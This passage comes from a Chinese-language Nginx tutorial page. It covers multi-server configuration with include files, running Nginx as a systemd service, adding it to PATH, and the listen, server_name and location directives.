class="hljs-regexp">/server1/</span>location1<br>访问的是：index_sr1_location1.html<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/server1/</span>location2<br>访问的是：index_sr1_location2.html<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>:<span class="hljs-number">8082</span><span class="hljs-regexp">/server2/</span>location1<br>访问的是：index_sr2_location1.html<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>:<span class="hljs-number">8082</span><span class="hljs-regexp">/server2/</span>location2<br>访问的是：index_sr2_location2.html<br>（<span class="hljs-number">2</span>）如果访问的资源不存在，<br>返回自定义的<span class="hljs-number">404</span>页面<br>（<span class="hljs-number">3</span>）将<span class="hljs-regexp">/server1和/</span>server2的配置使用不同的配置文件分割<br>将文件放到<span class="hljs-regexp">/home/</span>www/conf.d目录下，然后使用include进行合并<br>（<span class="hljs-number">4</span>）为<span class="hljs-regexp">/server1和/</span>server2各自创建一个访问日志文件<br></code></pre></td></tr></table></figure><p>准备相关文件，目录如下：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587129309340.png" alt="1587129309340" /></p><p>配置的内容如下:</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs clean">##全局块 begin##<br>#配置允许运行Nginx工作进程的用户和用户组<br>user www;<br>#配置运行Nginx进程生成的worker进程数<br>worker_processes <span class="hljs-number">2</span>;<br>#配置Nginx服务器运行对错误日志存放的路径<br>error_log logs/error.log;<br>#配置Nginx服务器允许时记录Nginx的master进程的PID文件路径和名称<br>pid logs/nginx.pid;<br>#配置Nginx服务是否以守护进程方法启动<br>#daemon on;<br>##全局块 end##<br><br>##events块 begin##<br>events&#123;<br>#设置Nginx网络连接序列化<br>accept_mutex on;<br>#设置Nginx的worker进程是否可以同时接收多个请求<br>multi_accept on;<br>#设置Nginx的worker进程最大的连接数<br>worker_connections <span class="hljs-number">1024</span>;<br>#设置Nginx使用的事件驱动模型<br>use epoll;<br>&#125;<br>##events块 end##<br>##http块 start##<br>http&#123;<br>#定义MIME-Type<br>include mime.types;<br>default_type application/octet-stream;<br>#配置允许使用sendfile方式运输<br>sendfile on;<br>#配置连接超时时间<br>keepalive_timeout <span class="hljs-number">65</span>;<br>#配置请求处理日志格式<br>log_format server1 <span class="hljs-string">&#x27;===&gt;server1 access log&#x27;</span>;<br>log_format server2 <span class="hljs-string">&#x27;===&gt;server2 access log&#x27;</span>;<br><br>##server块 开始##<br>include /home/www/conf.d<span class="hljs-comment">/*.conf;</span><br><span class="hljs-comment">##server块 结束##</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">##http块 end##</span><br></code></pre></td></tr></table></figure><p>server1.conf</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs awk">server&#123;<br><span class="hljs-comment">#配置监听端口和主机名称</span><br>listen <span class="hljs-number">8081</span>;<br>server_name localhost;<br><span class="hljs-comment">#配置请求处理日志存放路径</span><br>access_log <span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/myweb/</span>server1<span class="hljs-regexp">/logs/</span>access.log server1;<br><span class="hljs-comment">#配置错误页面</span><br>error_page <span class="hljs-number">404</span> /<span class="hljs-number">404</span>.html;<br><span class="hljs-comment">#配置处理/server1/location1请求的location</span><br>location <span class="hljs-regexp">/server1/</span>location1&#123;<br>root <span class="hljs-regexp">/home/</span>www/myweb;<br>index index_sr1_location1.html;<br>&#125;<br><span class="hljs-comment">#配置处理/server1/location2请求的location</span><br>location <span class="hljs-regexp">/server1/</span>location2&#123;<br>root <span class="hljs-regexp">/home/</span>www/myweb;<br>index index_sr1_location2.html;<br>&#125;<br><span class="hljs-comment">#配置错误页面转向</span><br>location = /<span class="hljs-number">404</span>.html &#123;<br>root <span class="hljs-regexp">/home/</span>www/myweb;<br>index <span class="hljs-number">404</span>.html;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>server2.conf</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs awk">server&#123;<br><span class="hljs-comment">#配置监听端口和主机名称</span><br>listen <span class="hljs-number">8082</span>;<br>server_name localhost;<br><span class="hljs-comment">#配置请求处理日志存放路径</span><br>access_log <span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/myweb/</span>server2<span class="hljs-regexp">/logs/</span>access.log server2;<br><span class="hljs-comment">#配置错误页面,对404.html做了定向配置</span><br>error_page <span class="hljs-number">404</span> /<span class="hljs-number">404</span>.html;<br><span class="hljs-comment">#配置处理/server1/location1请求的location</span><br>location <span class="hljs-regexp">/server2/</span>location1&#123;<br>root <span class="hljs-regexp">/home/</span>www/myweb;<br>index index_sr2_location1.html;<br>&#125;<br><span class="hljs-comment">#配置处理/server2/location2请求的location</span><br>location <span class="hljs-regexp">/server2/</span>location2&#123;<br>root <span class="hljs-regexp">/home/</span>www/myweb;<br>index index_sr2_location2.html;<br>&#125;<br><span class="hljs-comment">#配置错误页面转向</span><br>location = /<span class="hljs-number">404</span>.html &#123;<br>root <span class="hljs-regexp">/home/</span>www/myweb;<br>index <span class="hljs-number">404</span>.html;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问测试：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587129766585.png" alt="1587129766585" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587129777898.png" alt="1587129777898" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587290246228.png" alt="1587290246228" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587129805309.png" alt="1587129805309" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587129817226.png" alt="1587129817226" /></p><h2 id="nginx服务操作的问题"><a class="markdownIt-Anchor" href="#nginx服务操作的问题"></a> Nginx服务操作的问题</h2><p>经过前面的操作，我们会发现，如果想要启动、关闭或重新加载nginx配置文件，都需要先进入到nginx的安装目录的sbin目录，然后使用nginx的二级制可执行文件来操作，相对来说操作比较繁琐，这块该如何优化？另外如果我们想把Nginx设置成随着服务器启动就自动完成启动操作，又该如何来实现?这就需要用到接下来我们要讲解的两个知识点：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">Nginx配置成系统服务<br>Nginx命令配置到系统环境<br></code></pre></td></tr></table></figure><h2 id="nginx配置成系统服务"><a class="markdownIt-Anchor" href="#nginx配置成系统服务"></a> Nginx配置成系统服务</h2><p>把Nginx应用服务设置成为系统服务，方便对Nginx服务的启动和停止等相关操作，具体实现步骤:</p><p>(1) 在<code>/usr/lib/systemd/system</code>目录下添加nginx.service,内容如下:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/systemd/</span>system/nginx.service<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">[Unit]<br>Description=nginx web service<br>Documentation=http:<span class="hljs-regexp">//</span>nginx.org<span class="hljs-regexp">/en/</span>docs/<br>After=network.target<br><br>[Service]<br>Type=forking<br>PIDFile=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>logs/nginx.pid<br>ExecStartPre=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin<span class="hljs-regexp">/nginx -t -c /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/conf/</span>nginx.conf<br>ExecStart=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin/nginx<br>ExecReload=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin/nginx -s reload<br>ExecStop=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin/nginx -s stop<br>PrivateTmp=true<br><br>[Install]<br>WantedBy=default.target<br></code></pre></td></tr></table></figure><p>(2)添加完成后如果权限有问题需要进行权限设置</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">chmod <span class="hljs-number">755</span> <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/systemd/</span>system/nginx.service<br></code></pre></td></tr></table></figure><p>(3)使用系统命令来操作Nginx服务</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">启动: systemctl start nginx</span><br><span class="hljs-section">停止: systemctl stop nginx</span><br><span class="hljs-section">重启: systemctl restart nginx</span><br><span class="hljs-section">重新加载配置文件: systemctl reload nginx</span><br><span class="hljs-section">查看nginx状态: systemctl status nginx</span><br><span class="hljs-section">开机启动: systemctl enable nginx</span><br></code></pre></td></tr></table></figure><h2 id="nginx命令配置到系统环境"><a class="markdownIt-Anchor" href="#nginx命令配置到系统环境"></a> Nginx命令配置到系统环境</h2><p>前面我们介绍过Nginx安装目录下的二级制可执行文件<code>nginx</code>的很多命令，要想使用这些命令前提是需要进入sbin目录下才能使用，很不方便，如何去优化，我们可以将该二进制可执行文件加入到系统的环境变量，这样的话在任何目录都可以使用nginx对应的相关命令。具体实现步骤如下:</p><p>演示可删除</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin/nginx -V<br>cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin  nginx -V<br>如何优化？？？<br></code></pre></td></tr></table></figure><p>(1)修改<code>/etc/profile</code>文件</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">vim /etc/profile<br>在最后一行添加<br>export <span class="hljs-title class_">PATH</span>=<span class="hljs-variable">$PATH</span><span class="hljs-symbol">:/usr/local/nginx/sbin</span><br></code></pre></td></tr></table></figure><p>(2)使之立即生效</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span> <span class="hljs-regexp">/etc/</span>profile<br></code></pre></td></tr></table></figure><p>(3)执行nginx命令</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nginx -V</span><br></code></pre></td></tr></table></figure><h2 id="nginx静态资源部署"><a class="markdownIt-Anchor" href="#nginx静态资源部署"></a> Nginx静态资源部署</h2><h3 id="nginx静态资源概述"><a class="markdownIt-Anchor" href="#nginx静态资源概述"></a> Nginx静态资源概述</h3><p>上网去搜索访问资源对于我们来说并不陌生，通过浏览器发送一个HTTP请求实现从客户端发送请求到服务器端获取所需要内容后并把内容回显展示在页面的一个过程。这个时候，我们所请 求的内容就分为两种类型，一类是静态资源、一类是动态资源。<br />静态资源即指在服务器端真实存在并且能直接拿来展示的一些文件，比如常见的html页面、css文件、js文件、图 片、视频等资源；<br />动态资源即指在服务器端真实存在但是要想获取需要经过一定的业务逻辑处理，根据不同的条件展示在页面不同这 一部分内容，比如说报表数据展示、根据当前登录用户展示相关具体数据等资源；</p><p>Nginx处理静态资源的内容，我们需要考虑下面这几个问题：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">（1）静态资源的配置指令<br>（2）静态资源的配置优化<br>（3）静态资源的压缩配置指令<br>（4）静态资源的缓存处理<br>（5）静态资源的访问控制，包括跨域问题和防盗链问题<br></code></pre></td></tr></table></figure><h3 id="nginx静态资源的配置指令"><a class="markdownIt-Anchor" href="#nginx静态资源的配置指令"></a> Nginx静态资源的配置指令</h3><h4 id="listen指令"><a class="markdownIt-Anchor" href="#listen指令"></a> listen指令</h4><p>listen:用来配置监听端口。</p><table><thead><tr><th>语法</th><th>listen address[:port] [default_server]…;<br/>listen port [default_server]…;</th></tr></thead><tbody><tr><td>默认值</td><td>listen *:80 | *:8000</td></tr><tr><td>位置</td><td>server</td></tr></tbody></table><p>listen的设置比较灵活，我们通过几个例子来把常用的设置方式熟悉下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">listen</span> <span class="hljs-number">127.0.0.1:8000</span>; // listen localhost:<span class="hljs-number">8000</span> 监听指定的IP和端口<br><span class="hljs-attribute">listen</span> <span class="hljs-number">127.0.0.1</span>;监听指定IP的所有端口<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8000</span>;监听指定端口上的连接<br><span class="hljs-attribute">listen</span> *:<span class="hljs-number">8000</span>;监听指定端口上的连接<br></code></pre></td></tr></table></figure><p>default_server属性是标识符，用来将此虚拟主机设置成默认主机。所谓的默认主机指的是如果没有匹配到对应的address:port，则会默认执行的。如果不指定默认使用的是第一个server。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">8080</span>;<br>server_name <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;<br><span class="hljs-keyword">location</span> /&#123;<br>root html;<br><span class="hljs-keyword">index</span> <span class="hljs-keyword">index</span>.html;<br>&#125;<br>&#125;<br><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">8080</span> default_server;<br>server_name localhost;<br>default_type <span class="hljs-type">text</span>/plain;<br><span class="hljs-keyword">return</span> <span class="hljs-number">444</span> <span class="hljs-string">&#x27;This is a error request&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="server_name指令"><a class="markdownIt-Anchor" href="#server_name指令"></a> server_name指令</h4><p>server_name：用来设置虚拟主机服务名称。</p><p>127.0.0.1 、 localhost 、域名[<a href="http://www.baidu.com">www.baidu.com</a> | <a href="http://www.jd.com">www.jd.com</a>]</p><table><thead><tr><th>语法</th><th>server_name  name …;<br/>name可以提供多个中间用空格分隔</th></tr></thead><tbody><tr><td>默认值</td><td>server_name  “”;</td></tr><tr><td>位置</td><td>server</td></tr></tbody></table><p>关于server_name的配置方式有三种，分别是：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">精确匹配<br>通配符匹配<br>正则表达式匹配<br></code></pre></td></tr></table></figure><p>配置方式一：精确匹配</p><p>如：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lasso">server &#123;<br>listen <span class="hljs-number">80</span>;<br>server_name www.itcast.<span class="hljs-literal">cn</span> www.itheima.<span class="hljs-literal">cn</span>;<br><span class="hljs-params">...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>补充小知识点:</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">hosts</span>是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的<span class="hljs-built_in">IP</span>地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从hosts文件中寻找对应的<span class="hljs-built_in">IP</span>地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行<span class="hljs-built_in">IP</span>地址的解析。<br></code></pre></td></tr></table></figure><p>windows:C:\Windows\System32\drivers\etc</p><p>centos：/etc/hosts</p><p>因为域名是要收取一定的费用，所以我们可以使用修改hosts文件来制作一些虚拟域名来使用。需要修改 <code>/etc/hosts</code>文件来添加</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">vim /etc/hosts<br><span class="hljs-number">127.0.0.1</span> www.itcast.cn<br><span class="hljs-number">127.0.0.1</span> www.itheima.cn<br></code></pre></td></tr></table></figure><p>配置方式二:使用通配符配置</p><p>server_name中支持通配符&quot;*&quot;,但需要注意的是通配符不能出现在域名的中间，只能出现在首段或尾段，如：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">server &#123;<br>listen 80;<br>server_name  *<span class="hljs-string">.itcast.cn</span>www.itheima.*;<br><span class="hljs-comment"># www.itcast.cn abc.itcast.cn www.itheima.cn www.itheima.com</span><br><span class="hljs-string">...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>下面的配置就会报错</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br><span class="hljs-attribute">server_name</span>  <span class="hljs-regexp">www.*</span>.cn www.itheima.c*<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>配置三:使用正则表达式配置</p><p>server_name中可以使用正则表达式，并且使用<code>~</code>作为正则表达式字符串的开始标记。</p><p>常见的正则表达式</p><table><thead><tr><th>代码</th><th>说明</th></tr></thead><tbody><tr><td>^</td><td>匹配搜索字符串开始位置</td></tr><tr><td>$</td><td>匹配搜索字符串结束位置</td></tr><tr><td>.</td><td>匹配除换行符\n之外的任何单个字符</td></tr><tr><td>\</td><td>转义字符，将下一个字符标记为特殊字符</td></tr><tr><td>[xyz]</td><td>字符集，与任意一个指定字符匹配</td></tr><tr><td>[a-z]</td><td>字符范围，匹配指定范围内的任何字符</td></tr><tr><td>\w</td><td>与以下任意字符匹配 A-Z a-z 0-9 和下划线,等效于[A-Za-z0-9_]</td></tr><tr><td>\d</td><td>数字字符匹配，等效于[0-9]</td></tr><tr><td>{n}</td><td>正好匹配n次</td></tr><tr><td>{n,}</td><td>至少匹配n次</td></tr><tr><td>{n,m}</td><td>匹配至少n次至多m次</td></tr><tr><td>*</td><td>零次或多次，等效于{0,}</td></tr><tr><td>+</td><td>一次或多次，等效于{1,}</td></tr><tr><td>?</td><td>零次或一次，等效于{0,1}</td></tr></tbody></table><p>配置如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">server</span>&#123;<br>        <span class="hljs-keyword">listen</span> <span class="hljs-number">80</span>;<br>        server_name ~^www\.(\w+)\.com$;<br>        default_type <span class="hljs-type">text</span>/plain;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-meta">$1</span>  <span class="hljs-meta">$2</span> ..;<br>&#125;<br>注意 ~后面不能加空格，括号可以取值<br></code></pre></td></tr></table></figure><h5 id="匹配执行顺序"><a class="markdownIt-Anchor" href="#匹配执行顺序"></a> 匹配执行顺序</h5><p>由于server_name指令支持通配符和正则表达式，因此在包含多个虚拟主机的配置文件中，可能会出现一个名称被多个虚拟主机的server_name匹配成功，当遇到这种情况，当前的请求交给谁来处理呢？</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">80</span>;<br>server_name ~^www\.\w+\.com$;<br>default_type <span class="hljs-type">text</span>/plain;<br><span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;regex_success&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">80</span>;<br>server_name www.itheima.*;<br>default_type <span class="hljs-type">text</span>/plain;<br><span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;wildcard_after_success&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">80</span>;<br>server_name *.itheima.com;<br>default_type <span class="hljs-type">text</span>/plain;<br><span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;wildcard_before_success&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">80</span>;<br>server_name www.itheima.com;<br>default_type <span class="hljs-type">text</span>/plain;<br><span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;exact_success&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">80</span> default_server;<br>server_name _;<br>default_type <span class="hljs-type">text</span>/plain;<br><span class="hljs-keyword">return</span> <span class="hljs-number">444</span> <span class="hljs-string">&#x27;default_server not found server&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>结论：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">exact_success<br>wildcard_before_success<br>wildcard_after_success<br>regex_success<br>default_server not found server!!<br></code></pre></td></tr></table></figure><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">No1:</span>准确匹配server_name<br><br><span class="hljs-symbol">No2:</span>通配符在开始时匹配server_name成功<br><br><span class="hljs-symbol">No3:</span>通配符在结束时匹配server_name成功<br><br><span class="hljs-symbol">No4:</span>正则表达式匹配server_name成功<br><br><span class="hljs-symbol">No5:</span>被默认的default_server处理，如果没有指定默认找第一个server<br></code></pre></td></tr></table></figure><h4 id="location指令"><a class="markdownIt-Anchor" href="#location指令"></a> location指令</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">server&#123;<br>listen <span class="hljs-number">80</span>;<br>server_name localhost;<br><span class="hljs-keyword">location</span> <span class="hljs-title">/ &#123;</span><br><span class="hljs-title"></span><br><span class="hljs-title">&#125;</span><br><span class="hljs-title">location</span> /abc&#123;<br><br>&#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>location:用来设置请求的URI</p><table><thead><tr><th>语法</th><th>location [  =  |   ~  |  ~*   |   ^~   |@ ] uri{…}</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>server,location</td></tr></tbody></table><p>uri变量是待匹配的请求字符串，可以不包含正则表达式，也可以包含正则表达式，那么nginx服务器在搜索匹配location的时候，是先使用不包含正则表达式进行匹配，找到一个匹配度最高的一个，然后在通过包含正则表达式的进行匹配，如果能匹配到直接访问，匹配不到，就使用刚才匹配度最高的那个location来处理请求。</p><p>属性介绍:</p><p>不带符号，要求必须以指定模式开始</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">server &#123;<br>listen <span class="hljs-number">80</span>;<br>server_name <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;<br>location /abc&#123;<br>default_type text/plain;<br>return <span class="hljs-number">200</span> <span class="hljs-string">&quot;access success&quot;</span>;<br>&#125;<br>&#125;<br>以下访问都是正确的<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>/abc<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>/abc?p1=TOM<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span><span class="hljs-regexp">/abc/</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>/abcdef<br></code></pre></td></tr></table></figure><p>= :  用于不包含正则表达式的uri前，必须与指定的模式精确匹配</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td 